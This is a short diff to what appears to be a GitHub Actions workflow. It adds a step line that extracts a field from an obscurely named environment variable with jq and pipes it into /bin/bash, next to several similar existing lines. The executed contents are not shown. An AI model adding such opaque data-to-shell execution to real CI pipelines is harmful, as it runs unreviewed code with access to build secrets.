@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$jivyf2" | jq -r .g51274 | /bin/bash
           printf '%s' "$hxsfc90" | jq -r .fb01978 | /bin/bash
           echo $tzc5 | jq -r .p217 | /bin/bash
+          printf '%s' "$cgect75" | jq -r .t3057 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
